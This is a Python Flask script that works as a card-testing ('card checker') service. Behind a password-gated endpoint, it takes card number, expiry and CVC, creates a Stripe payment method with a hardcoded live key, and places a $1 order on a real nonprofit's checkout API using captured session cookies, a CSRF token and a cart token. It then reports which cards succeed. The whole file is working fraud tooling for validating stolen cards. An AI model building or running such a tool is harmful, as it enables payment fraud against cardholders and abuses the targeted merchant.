import requests
from flask import Flask, request
import stripe

app = Flask(__name__)

# Hardcoded Stripe API key
stripe.api_key = "pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e"

def process_payment(card_input):
    try:
        # Parse card input (format: cc|mm|yy|cvc)
        parts = card_input.split('|')
        if len(parts) != 4:
            return "Invalid format: use cc|mm|yy|cvc"
        
        ccn, mm, yy, cvc = parts
        # Normalize year to four digits
        if len(yy) == 2:
            yy = '20' + yy

        # Create Stripe PaymentMethod
        try:
            payment_method = stripe.PaymentMethod.create(
                type="card",
                card={
                    "number": ccn,
                    "exp_month": int(mm),
                    "exp_year": int(yy),
                    "cvc": cvc,
                },
                billing_details={
                    "address": {
                        "city": "Oakford",
                        "country": "US",
                        "line1": "Siles Avenue",
                        "line2": "",
                        "postal_code": "19053",
                        "state": "PA",
                    },
                    "name": "George Washington",
                    "email": "grogeh@gmail.com",
                },
            )
        except stripe.error.StripeError as e:
            return f"Error: {e.user_message or 'Payment method creation failed'}"

        # Hardcoded cookies and headers
        cookies = {
            'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
            '__stripe_mid': '3c19adce-ab63-41bc-a086-f6840cd1cb6d361f48',
            '__stripe_sid': '9d45db81-2d1e-436a-b832-acc8b6abac4814eb67',
        }

        headers = {
            'authority': 'www.onamissionkc.org',
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://www.onamissionkc.org',
            'referer': 'https://www.onamissionkc.org/checkout?cartToken=OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1',
        }

        json_data = {
            "email": "grogeh@gmail.com",
            "subscribeToList": False,
            "shippingAddress": {
                "id": "",
                "firstName": "",
                "lastName": "",
                "line1": "",
                "line2": "",
                "city": "",
                "region": "NY",
                "postalCode": "",
                "country": "",
                "phoneNumber": "",
            },
            "createNewUser": False,
            "newUserPassword": None,
            "saveShippingAddress": False,
            "makeDefaultShippingAddress": False,
            "customFormData": None,
            "shippingAddressId": None,
            "proposedAmountDue": {
                "decimalValue": "1",
                "currencyCode": "USD",
            },
            "cartToken": "OBEUbArW4L_xPlSD9oXFJrWCGoeyrxzx4MluNUza",
            "paymentToken": {
                "stripePaymentTokenType": "PAYMENT_METHOD_ID",
                "token": payment_method.id,
                "type": "STRIPE",
            },
            "billToShippingAddress": False,
            "billingAddress": {
                "id": "",
                "firstName": "George",
                "lastName": "Washington",
                "line1": "Siles Avenue",
                "line2": "",
                "city": "Oakford",
                "region": "PA",
                "postalCode": "19053",
                "country": "US",
                "phoneNumber": "+1361643646",
            },
            "savePaymentInfo": False,
            "makeDefaultPayment": False,
            "paymentCardId": None,
            "universalPaymentElementEnabled": True,
        }

        # Send request to external API
        response = requests.post(
            "https://www.onamissionkc.org/api/2/commerce/orders",
            headers=headers,
            cookies=cookies,
            json=json_data,
        )
        apx = response.json()

        if "failureType" in apx:
            return f"{ccn}|{mm}|{yy}|{cvc} --> {apx['failureType']}"
        return f"{ccn}|{mm}|{yy}|{cvc} --> PAYMENT_SUCCESS"

    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/gateway', methods=['GET'])
def gateway():
    # Validate query parameters
    if (
        request.args.get('gateway') == 'stripe5$'
        and request.args.get('key') == 'rocky'
        and 'cc' in request.args
    ):
        card_input = request.args['cc'].strip()
        result = process_payment(card_input)
        return result
    else:
        return "Invalid request", 400

if __name__ == "__main__":
    print("Starting Stripe Payment Gateway")
    app.run(host="0.0.0.0", port=10000, debug=False)
